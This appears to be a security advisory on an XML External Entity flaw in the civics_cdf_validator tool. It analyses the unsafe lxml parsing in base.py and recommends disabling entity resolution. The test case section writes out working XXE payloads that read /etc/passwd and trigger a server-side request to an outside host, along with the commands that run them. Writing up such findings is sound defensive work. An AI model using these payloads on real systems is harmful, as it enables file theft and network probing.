- Vulnerability Name: XML External Entity (XXE) Injection
- Description:
    1. An attacker crafts a malicious XML file.
    2. This malicious XML file contains an XML External Entity (XXE) payload.
    3. A user is tricked or unknowingly validates this malicious XML file using `civics_cdf_validator` by providing the malicious XML file path to the `validate` command.
    4. The `civics_cdf_validator` script uses the `lxml` library to parse the XML file.
    5. If `lxml` is not configured to disable external entity processing, it attempts to resolve and process the external entity defined in the malicious XML.
    6. This allows the attacker to exploit the XXE vulnerability to:
        - Read local files on the system where `civics_cdf_validator` is executed, by referencing local file paths in the XXE payload.
        - Perform Server-Side Request Forgery (SSRF) by making the server initiate requests to other servers, including internal ones, if the XXE payload references external URLs.
- Impact:
    - Confidentiality: High. An attacker can read sensitive local files from the system running `civics_cdf_validator`, potentially exposing configuration files, source code, or data.
    - Security: Medium. In case of SSRF, an attacker could potentially probe internal network resources or cause other security impacts depending on the internal services and how they react to requests from the server running `civics_cdf_validator`.
- Vulnerability Rank: High
- Currently implemented mitigations:
    - There are no mitigations implemented in the provided project files to prevent XXE vulnerabilities. The code uses `lxml.etree.parse` without any options to disable external entity processing.
- Missing mitigations:
    - The project is missing explicit mitigations to disable XML External Entity (XXE) processing in the `lxml` library.
    - Mitigation should be implemented by configuring the `lxml` parser to disable `resolve_entities`. This can be done when creating an `etree.XMLParser` instance and passing it to the `etree.parse()` function.
- Preconditions:
    - An attacker needs to provide a malicious XML file to a user.
    - The user must execute `civics_cdf_validator validate` command and provide the path to the malicious XML file as `election_files` argument.
    - The user must have network connectivity if the attacker intends to exploit SSRF.
- Source code analysis:
    - The vulnerability exists because the project uses the `lxml` library to parse XML files without explicitly disabling external entity processing.
    - In `/code/base.py` and `/code/validator.py`, the `etree.parse()` function is called to parse both schema files and election files:
        - `/code/base.py`:
          ```python
          from lxml import etree
          ...
          class RulesRegistry(SchemaHandler):
              ...
              def check_rules(self):
                  """Checks all rules."""
                  try:
                      self.schema_tree = etree.parse(self.schema_file)
                      self.election_tree = etree.parse(self.election_file)
                  except etree.LxmlError as e:
                      ...
          ```
        - `/code/validator.py`:
          ```python
          from lxml import etree
          ...
          def main():
              ...
              elif options.cmd == "validate":
                  ...
                  options.xsd = open(options.xsd, "r")
                  validation_results = feed_validation(options)
                  ...
          @exec_profiling
          def feed_validation(options, ocd_id_list=None):
              ...
              registry = base.RulesRegistry(
                  election_file=election_file,
                  schema_file=options.xsd,
                  ...
              )
              registry.check_rules()
              ...
          ```
    - The `etree.parse()` calls in `RulesRegistry.check_rules()` are vulnerable because they do not specify an `XMLParser` instance with `resolve_entities=False`. This default behavior of `lxml` allows external entities to be resolved and processed, leading to the XXE vulnerability.
- Security test case:
    1. Create a malicious XML file named `malicious.xml` with the following content to test local file access (e.g., `/etc/passwd` on Linux systems):
        ```xml
        <?xml version="1.0"?>
        <!DOCTYPE data [
          <!ELEMENT data ANY>
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <data>
          <content>&xxe;</content>
        </data>
        ```
    2. Create a dummy XSD file named `dummy_spec.xsd` (can be empty or a copy of any XSD from the project if available, e.g., `civics_cdf_spec.xsd`):
        ```xml
        <?xml version="1.0" encoding="UTF-8"?>
        <xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema" elementFormDefault="qualified"
        attributeFormDefault="unqualified"></xs:schema>
        ```
    3. Run the `civics_cdf_validator validate` command with the malicious XML file and the dummy XSD:
        ```bash
        civics_cdf_validator validate malicious.xml --xsd dummy_spec.xsd
        ```
    4. Examine the output. If the `/etc/passwd` file content is printed in the output or if an error message related to file access is observed, it confirms that the XXE vulnerability is present. For verbose output use `-v` flag:
        ```bash
        civics_cdf_validator validate malicious.xml --xsd dummy_spec.xsd -v
        ```
    5. For SSRF test case, modify the `malicious.xml` to:
        ```xml
        <?xml version="1.0"?>
        <!DOCTYPE data [
          <!ELEMENT data ANY>
          <!ENTITY xxe SYSTEM "http://example.com">
        ]>
        <data>
          <content>&xxe;</content>
        </data>
        ```
    6. Run the validator again:
        ```bash
        civics_cdf_validator validate malicious.xml --xsd dummy_spec.xsd -v
        ```
    7. Use network monitoring tools (like `tcpdump` or `Wireshark`) on the machine running `civics_cdf_validator` to check if there is an outgoing HTTP request to `example.com`. If a request is observed, it confirms the SSRF vulnerability.
